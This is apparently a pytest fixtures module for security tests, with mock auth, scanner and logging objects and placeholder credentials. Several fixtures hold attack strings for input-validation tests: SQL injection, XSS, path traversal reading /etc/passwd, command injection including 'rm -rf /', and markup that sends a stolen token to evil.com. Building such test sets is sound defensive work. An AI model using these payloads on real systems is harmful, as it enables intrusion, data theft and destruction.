"""
Security testing fixtures for pytest.

This module provides fixtures specifically for security testing.
"""

import hashlib
import hmac
from collections.abc import Generator
from typing import Any
from unittest.mock import Mock

import pytest


@pytest.fixture
def security_context() -> Generator[dict[str, Any], None, None]:
    """Provide security context for testing."""
    return {
        "user_id": "test-user-123",
        "organization_id": "test-org-123",
        "roles": ["user"],
        "permissions": ["read", "write"],
        "auth_token": "test-token-123",
        "session_id": "test-session-123",
        "ip_address": "127.0.0.1",
        "user_agent": "test-agent",
        "request_id": "test-request-123",
    }


@pytest.fixture
def mock_auth_client() -> Mock:
    """Create a mock authentication client for testing."""
    client = Mock()
    client.authenticate = Mock(return_value={"success": True, "user_id": "test-user-123"})
    client.authorize = Mock(return_value={"success": True, "permissions": ["read", "write"]})
    client.validate_token = Mock(return_value={"valid": True, "user_id": "test-user-123"})
    client.refresh_token = Mock(return_value={"success": True, "token": "new-token-123"})
    client.logout = Mock(return_value={"success": True})
    return client


@pytest.fixture
def mock_security_scanner() -> Mock:
    """Create a mock security scanner for testing."""
    scanner = Mock()
    scanner.scan_vulnerabilities = Mock(return_value={"vulnerabilities": []})
    scanner.scan_dependencies = Mock(return_value={"vulnerabilities": []})
    scanner.scan_secrets = Mock(return_value={"secrets": []})
    scanner.scan_code = Mock(return_value={"issues": []})
    return scanner


@pytest.fixture
def test_credentials() -> dict[str, str]:
    """Provide test credentials for testing."""
    return {
        "username": "testuser",
        "password": "testpassword123",
        "email": "test@example.com",
        "api_key": "test-api-key-123",
        "secret": "test-secret-123",
    }


@pytest.fixture
def test_tokens() -> dict[str, str]:
    """Provide test tokens for testing."""
    return {
        "access_token": "test-access-token-123",
        "refresh_token": "test-refresh-token-123",
        "id_token": "test-id-token-123",
        "csrf_token": "test-csrf-token-123",
    }


@pytest.fixture
def test_hashes() -> dict[str, str]:
    """Provide test hashes for testing."""
    test_string = "test-string-123"
    return {
        "md5": hashlib.md5(test_string.encode()).hexdigest(),
        "sha1": hashlib.sha1(test_string.encode()).hexdigest(),
        "sha256": hashlib.sha256(test_string.encode()).hexdigest(),
        "sha512": hashlib.sha512(test_string.encode()).hexdigest(),
        "hmac": hmac.new(b"secret-key", test_string.encode(), hashlib.sha256).hexdigest(),
    }


@pytest.fixture
def test_encryption_data() -> dict[str, Any]:
    """Provide test encryption data for testing."""
    return {
        "plaintext": "test-plaintext-123",
        "ciphertext": "encrypted-test-data-123",
        "key": "test-encryption-key-123",
        "iv": "test-initialization-vector-123",
        "algorithm": "AES-256-GCM",
    }


@pytest.fixture
def test_sql_injection_payloads() -> list[str]:
    """Provide test SQL injection payloads for testing."""
    return [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "1'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ]


@pytest.fixture
def test_xss_payloads() -> list[str]:
    """Provide test XSS payloads for testing."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
    ]


@pytest.fixture
def test_csrf_payloads() -> list[str]:
    """Provide test CSRF payloads for testing."""
    return [
        "<form action='http://evil.com/steal' method='POST'><input name='token' value='stolen-token'></form>",
        "<img src='http://evil.com/steal?token=stolen-token'>",
        "<script>fetch('http://evil.com/steal', {method: 'POST', body: 'token=stolen-token'})</script>",
    ]


@pytest.fixture
def test_path_traversal_payloads() -> list[str]:
    """Provide test path traversal payloads for testing."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]


@pytest.fixture
def test_command_injection_payloads() -> list[str]:
    """Provide test command injection payloads for testing."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(id)",
        "; rm -rf /",
    ]


@pytest.fixture
def security_headers() -> dict[str, str]:
    """Provide security headers for testing."""
    return {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'",
        "Referrer-Policy": "strict-origin-when-cross-origin",
        "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
    }


@pytest.fixture
def mock_encryption_service() -> Mock:
    """Create a mock encryption service for testing."""
    service = Mock()
    service.encrypt = Mock(return_value="encrypted-data-123")
    service.decrypt = Mock(return_value="decrypted-data-123")
    service.generate_key = Mock(return_value="generated-key-123")
    service.generate_iv = Mock(return_value="generated-iv-123")
    return service


@pytest.fixture
def mock_audit_logger() -> Mock:
    """Create a mock audit logger for testing."""
    logger = Mock()
    logger.log_auth_success = Mock()
    logger.log_auth_failure = Mock()
    logger.log_permission_denied = Mock()
    logger.log_security_event = Mock()
    logger.log_data_access = Mock()
    logger.log_data_modification = Mock()
    return logger
